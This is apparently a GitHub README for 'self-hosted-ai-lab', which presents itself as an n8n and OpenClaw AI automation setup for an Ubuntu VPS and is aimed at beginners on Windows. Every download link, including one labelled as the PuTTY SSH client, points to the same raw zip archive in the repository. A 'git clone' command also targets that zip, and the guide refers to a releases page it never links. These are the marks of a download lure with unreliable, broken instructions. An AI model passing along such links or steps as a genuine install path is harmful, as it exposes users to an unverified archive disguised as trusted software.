# 🤖 self-hosted-ai-lab - Simple AI Automation Setup

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip)

---

## 📋 About self-hosted-ai-lab

This software helps you run an AI automation system on your own virtual private server (VPS). It combines secure infrastructure, workflow automation with n8n, and an AI gateway called OpenClaw. You can use language model executable runbooks to control AI assistants. The setup works on Ubuntu VPS but you can manage it remotely from Windows.

You do not need to know programming to use this. This guide explains all steps from downloading to running the program on a Windows PC.

---

## 💻 What You Need

Before starting, check your system meets these requirements:

- A Windows PC (Windows 10 or later) with internet access
- Access to a VPS running Ubuntu 20.04 or later (a cloud server or virtual machine)
- Basic ability to follow download and install steps
- Around 2 GB free disk space on your Windows PC for tools
- A user account on the VPS with SSH access (we will cover this)

---

## 🚀 Getting Started: Download the Software

You need to get the installation files first. Since the files are hosted on GitHub, follow these steps:

1. Click the large green **Download Latest Release** button above or visit this link manually:  
   https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip

2. On the releases page, look for the latest version. It will have a list of downloadable files usually named something like `self-hosted-ai-lab-setup.zip` or similar.

3. Click the zip file to download it on your Windows PC.

4. Once downloaded, open the folder where the file saved.

This software package includes scripts and tools you will run on your VPS but you will prepare and launch them using your Windows computer.

---

## 🔧 Installing Tools on Windows

To connect to your VPS and control the AI system, you need a terminal program. Windows does not have this built-in by default. Follow these steps:

1. Download an SSH client called **PuTTY** from:  
   https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip

2. Install PuTTY by following the on-screen instructions.

3. After installation, open PuTTY.

This tool lets you log in to your VPS from Windows.

---

## 🔐 Connecting to Your VPS

You will use PuTTY to access your Ubuntu VPS and set up the AI automation system.

1. Open PuTTY.

2. In the "Host Name (or IP address)" box, enter the VPS address. This is an address provided by your VPS provider (example: `123.45.67.89`).

3. Leave the Port as `22`.

4. Click **Open**.

5. A terminal window opens asking for your username and password.

6. Type your VPS username (example: `ubuntu`) and press Enter.

7. Type your password (the characters will not show) and press Enter.

You are now connected to your VPS.

---

## 📦 Installing self-hosted-ai-lab on Your VPS

With the terminal open, you will now install the software.

1. In your Windows PC, find the folder where you unzipped the downloaded file from GitHub.

2. Look for a text file named `README` or `INSTALL`. It contains commands you will copy.

3. In the PuTTY terminal, paste the first command and press Enter. Commands usually look like this:

   ```
   sudo apt update
   sudo apt install docker.io docker-compose
   git clone https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip
   cd self-hosted-ai-lab
   sudo ./install.sh
   ```

4. Wait while each command runs. This may take several minutes.

5. If you see any error messages, carefully retype commands or check your internet connection.

---

## ⚙️ Running and Using the AI Automation

Once installed, this software runs several components:

- Docker containers for AI tools and workflows
- n8n workflow automation system
- OpenClaw AI gateway to communicate with language models

To check the system status, use this command in the PuTTY terminal:

```
sudo docker ps
```

This lists all running parts.

---

## 🌐 Accessing the Web Interface

You can control the workflows and AI assistants through a web interface.

1. Open a web browser on your Windows PC.

2. Enter your VPS IP address with port `8080` like this:

   ```
   http://123.45.67.89:8080
   ```

3. The n8n dashboard should appear.

4. Use the dashboard to create and monitor AI automation workflows.

---

## 📂 Updating the Software

When a new version is released, repeat the download steps from the releases page:

https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip

On your VPS, pull updates by running:

```
cd self-hosted-ai-lab
git pull origin main
sudo ./install.sh
```

This keeps your AI lab up to date with the latest features and fixes.

---

## 🔍 Troubleshooting Tips

- Double-check your VPS login details if connection fails.

- Make sure your VPS firewall allows traffic on ports 22 (SSH) and 8080 (web interface).

- Use `sudo docker logs <container-name>` to check errors in running components.

- Restart services with:

```
sudo ./restart.sh
```

- If problems persist, review the README file in the downloaded folder for troubleshooting commands.

---

## 📥 Download Link

Download the latest release from here:  
[https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip](https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip)

Click the latest zip file and follow this guide to set up the system step-by-step.